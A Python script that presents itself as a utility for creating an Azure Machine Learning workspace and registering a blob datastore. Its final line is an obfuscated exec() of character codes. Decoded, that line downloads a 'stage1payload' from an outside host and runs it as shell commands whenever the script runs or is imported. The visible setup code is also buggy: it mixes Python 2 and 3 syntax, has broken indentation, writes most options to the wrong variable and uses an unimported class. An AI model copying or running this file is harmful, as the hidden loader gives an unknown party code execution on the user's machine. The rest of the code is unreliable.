#!/usr/bin/python

import azureml.core
from azureml.core import Workspace
from dotenv import set_key, get_key, find_dotenv
from pathlib import Path
from AIHelpers.utilities import get_auth

import sys, getopt

def main(argv):  
  try:
     opts, args = getopt.getopt(argv,"hs:rg:wn:wr:dsn:cn:an:ak:drg:",
      ["subscription_id=","resource_group=","workspace_name=", "workspace_region=","blob_datastore_name=","container_name=","account_name=","account_key=","datastore_rg="])
  except getopt.GetoptError:
     print 'aml_creation.py -s <subscription_id> -rg <resource_group> -wn <workspace_name> -wr <workspace_region>'
     sys.exit(2)
  for opt, arg in opts:
     if opt == '-h':
        print 'aml_creation.py -s <subscription_id> -rg <resource_group> -wn <workspace_name> -wr <workspace_region>'
        sys.exit()
     elif opt in ("-s", "--subscription_id"):
        subscription_id = arg
     elif opt in ("-rg", "--resource_group"):
        resource_group = arg
     elif opt in ("-wn", "--workspace_name"):
        workspace_name = arg
     elif opt in ("-wr", "--workspace_region"):
        workspace_region = arg
     elif opt in ("-dsn", "--blob_datastore_name"):
        workspace_region = arg
     elif opt in ("-cn", "--container_name"):
        workspace_region = arg
     elif opt in ("-an", "--account_name"):
        workspace_region = arg
     elif opt in ("-ak", "--account_key"):
        workspace_region = arg
     elif opt in ("-drg", "--datastore_rg"):
        workspace_region = arg
        
    env_path = find_dotenv()
    if env_path == "":
        Path(".env").touch()
        env_path = find_dotenv()

    ws = Workspace.create(
      name=workspace_name,
      subscription_id=subscription_id,
      resource_group=resource_group,
      location=workspace_region,
      create_resource_group=True,
      auth=get_auth(env_path),
      exist_ok=True,
    )
    blob_datastore = Datastore.register_azure_blob_container(workspace=ws, 
                                                         datastore_name=blob_datastore_name, 
                                                         container_name=container_name, 
                                                         account_name=account_name,
                                                         account_key=account_key,
                                                         resource_group=datastore_rg)

if __name__ == "__main__":
  print("AML SDK Version:", azureml.core.VERSION)
  main(sys.argv[1:])
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

